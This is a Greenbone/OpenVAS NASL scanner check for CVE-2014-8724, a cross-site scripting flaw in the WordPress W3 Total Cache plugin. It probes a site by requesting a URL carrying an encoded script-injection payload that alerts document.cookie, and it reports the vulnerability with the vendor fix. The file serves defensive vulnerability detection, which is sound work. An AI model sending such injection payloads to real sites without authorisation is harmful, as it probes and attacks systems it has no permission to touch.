# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805117");
  script_version("2024-01-09T05:06:46+0000");
  script_cve_id("CVE-2014-8724");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2024-01-09 05:06:46 +0000 (Tue, 09 Jan 2024)");
  script_tag(name:"creation_date", value:"2014-12-23 19:03:57 +0530 (Tue, 23 Dec 2014)");
  script_name("WordPress W3 Total Cache < 0.9.4.1 XSS Vulnerability - Active Check");

  script_tag(name:"summary", value:"WordPress W3 Total Cache is prone to a cross-site scripting
  (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Flaw is due to improper validation of input that contains the
  Cache Key and is passed via the URL before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code in a users browser session in the context of an affected site.");

  script_tag(name:"affected", value:"WordPress W3 Total Cache versions prior to 0.9.4.1.");

  script_tag(name:"solution", value:"Update to version 0.9.4.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://wpvulndb.com/vulnerabilities/7718");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71665");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/129626");
  script_xref(name:"URL", value:"https://www.secuvera.de/advisories/secuvera-SA-2014-01.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/w3-total-cache/index.html";

if(http_vuln_check(port:port, url:url, usecache:TRUE,
   check_header:TRUE, pattern:"^HTTP/1\.[01] 200")) {
  url = dir + "/wp-content/plugins/w3-total-cache/%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%22";

  if(http_vuln_check(port:port, url:url, check_header:TRUE,
     pattern:"<script>alert\(document\.cookie\)</script>")) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }

  exit(99);
}

exit(0);
